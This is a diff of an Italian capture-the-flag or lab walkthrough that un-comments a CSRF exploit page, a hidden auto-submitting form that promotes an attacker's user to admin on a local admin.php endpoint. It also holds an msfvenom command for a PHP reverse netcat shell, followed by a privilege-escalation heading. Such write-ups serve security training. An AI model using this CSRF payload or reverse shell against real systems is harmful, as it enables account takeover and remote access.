@@ -125,8 +125,7 @@
 <details open>
 	<summary> ✴️ HINT guarda rilultati foothold. </summary>
 	<p dir="auto">
-	<!--  <p dir="auto">
-			<!DOCTYPE html>
+		<!DOCTYPE html>
 			<html lang="it">
 				<head>
 					<title>Sito Malevolo - CSRF Exploit</title>
@@ -134,9 +133,9 @@
 				<body>
 					<p>Caricamento in corso...</p>
 					<!-- Il form punta all'endpoint vulnerabile sul container web -->
-		<!--			<form id="csrfForm" action="http://127.0.0.1:8080/app_internal/admin.php" method="POST"> 
+					<form id="csrfForm" action="http://127.0.0.1:8080/app_internal/admin.php" method="POST"> 
 						<!-- ID dell'utente dell'attaccante da promuovere (es. ID 2 per analyst) -->
-		<!--				<input type="hidden" name="user_id" value="3">
+						<input type="hidden" name="user_id" value="3">
 						<input type="hidden" name="new_role" value="admin">
 					</form>
 					<script>
@@ -145,30 +144,33 @@
 					</script>
 				</body>
 			</html>
-		-->
 	</p>
 </details>
-+ Salviamolo come malicius.html e prepariamo un server web con python in attesa di richieste.
+
+# Salviamolo come malicius.html e prepariamo un server web con python in attesa di richieste.
 
 ```bash
 python3 -m http.server 8000
 ```
+<details dir="open">
+	<summary> 🧨 Spiegazione della fase finale clicca  per espandere.</summary>summary
+	<p>
 + inviamo la richiesta dal pannello con la nostra direzione url puntando a malicius.html
 + subito dopo notiamo che riceviamo la richiesta dall wev server . apro altra pagina rieseguo il login con le credenziali create per accedere al sito e...
 + l'exploit a funzionato siamo loggati come utenti admin tramite attacco CSRF, subito dopo notiamo un pannello di amministrazione dove si puo caricare un immagine profilo
 + l'unico problema resta che accetta solo file .zip.
+	</p>
 
+#  Reverseshell con `msfvenom`
 ```bash
 msfvenom -p php/unix/cmd/reverse_netcat LHOST=172.X.X,X LPORT=4444 -f raw > shell.php
 chmod +x shell.php
 ```
-* Siamo dentro come utente www-data.</p>
-
-
-
+* Siamo dentro come utente www-data.
 
 # Privilege Escalation
-* dopo una lunga ricerca ed enumerazione di systema troviamo le credenziali per elevare i nostri privilegi.
+* dopo una lunga ricerca ed enumerazione del sistema, troviamo le credenziali per elevare i nostri privilegi.
+
 <details open>
 	<summary> ✴️ HINT Guarda risultato privilege escalation </summary>
 		<p dir="auto">
